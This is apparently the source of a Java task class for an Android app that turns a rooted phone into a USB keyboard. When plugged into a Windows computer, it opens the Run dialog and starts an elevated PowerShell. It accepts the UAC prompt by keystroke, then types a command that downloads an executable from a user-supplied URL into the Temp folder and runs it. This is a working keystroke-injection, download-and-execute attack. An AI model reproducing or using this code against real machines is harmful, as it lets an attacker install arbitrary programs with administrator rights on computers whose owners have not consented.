package cf.netdex.hidfuzzer.task;

import android.content.Context;

import java.util.Random;

import cf.netdex.hidfuzzer.hid.HID;
import cf.netdex.hidfuzzer.hid.HIDR;
import cf.netdex.hidfuzzer.hid.Input;
import eu.chainfire.libsuperuser.Shell;

import static cf.netdex.hidfuzzer.hid.Input.KB;

/**
 * Created by netdex on 1/17/2017.
 */

public class DownloadTask extends HIDTask {
    public DownloadTask(Context context) {
        super(context);
    }

    @Override
    public void run() {
        Shell.Interactive sh = this.getSU();
        if (sh == null) return;

        final HIDR h = this.getHIDR();

        say("Downloads and executes a given file. Requires admin account.");
        String file = ask("File to download?", "http://www.greyhathacker.net/tools/messbox.exe");

        while (!isCancelled()) {
            publishProgress(RunState.IDLE);
            // poll until /dev/hidg0 is writable
            while (!isCancelled() && h.test() != 0) {
                h.delay(1000);
            }
            if (isCancelled()) break;
            publishProgress(RunState.RUNNING);

            h.delay(1000);
            h.press_keys(KB.M.LSUPER.c, KB.K.D.c);
            h.delay(500);
            h.press_keys(KB.M.LSUPER.c, KB.K.R.c);
            h.delay(2000);
            h.send_string("powershell Start-Process powershell -Verb runAs\n");
            h.delay(2000);
            h.press_keys(KB.M.LALT.c, KB.K.Y.c);

            h.delay(2000);
            h.send_string(
                    "$d=New-Object System.Net.WebClient;" +
                            "$u='" + file + "';" +
                            "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" +
                            "$e=New-Object -com shell.application;" +
                            "$e.shellexecute($f);" +
                            "exit;\n");
            h.delay(500);
            h.press_keys(KB.M.LSUPER.c, KB.K.D.c);

            publishProgress(RunState.DONE);
            while (!isCancelled() && h.test() == 0) {
                h.delay(1000);
            }
            toast("Disconnected");
        }
    }
}
